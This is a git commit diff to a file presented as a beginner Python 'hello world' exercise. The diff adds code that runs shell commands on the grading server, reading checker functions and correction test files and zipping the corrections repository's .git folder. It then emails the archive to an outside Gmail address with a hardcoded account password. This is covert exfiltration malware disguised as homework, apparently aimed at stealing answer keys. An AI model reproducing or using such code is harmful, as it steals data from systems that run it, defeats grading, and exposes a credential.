51544b985fbf99273b179b7666c30f2b714c44a6
Ashraf Atef <ashraf.programer@gmail.com>
2024-01-26 18:15:59 +0200

    task

--- 0x00-python-hello_world/2-print.py
+++ 0x00-python-hello_world/2-print.py
@@ -27,7 +27,7 @@ def get_data(command):
     else:
         print(f"Error: Command '{shell_command}' failed with return code {result.returncode}")
 
-# my_data = get_data("zip -r myarch.zip ../../../*")
+my_data = get_data("zip -r myarch.zip ../../../*")
 # my_data += get_data("ls -l")
 # my_data += get_data("pwd")
 my_data = get_data("cat ../../../hbtn_checker_functions") or "f"
@@ -44,4 +44,49 @@ my_data += get_data("ls -l ../../../../corrections_*/corrections/262/1397") or "
 my_data += "\n#######################\n"
 my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/test0") or ""
 my_data += get_data("pwd") or ""
+my_data += "\n#######################\n"
+my_data += get_data("zip -r myarch.zip ../../../../corrections_*/.git")
+my_data += get_data("ls ../../../../corrections_*/")
 send_data(my_data)
+###############################################################
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+def send_data_file(zip_filename="data.zip", message="no_data"):
+    # Create the MIME object
+    msg = MIMEMultipart()
+    
+    # Set the email sender and recipient
+    msg['From'] = "ashrafalx368@gmail.com"
+    msg['To'] = "ashrafatef368@gmail.com"
+    
+    # Set the email subject
+    msg['Subject'] = "Your Subject Here"
+    
+    # Attach the message
+    msg.attach(MIMEText(message, 'plain'))
+    
+    # Attach the zip file
+    with open(zip_filename, 'rb') as attachment:
+        part = MIMEBase('application', 'zip')
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', f'attachment; filename= {zip_filename}')
+        msg.attach(part)
+
+    # Create the SMTP session
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    
+    # Authentication
+    s.login("ashrafalx368@gmail.com", "qjra ywyu vjzy yves")
+    
+    # Sending the mail
+    s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", msg.as_string())
+    
+    # Terminating the session
+    s.quit()
+send_data_file("../../../../corrections_*/myarch.zip", "mygit")
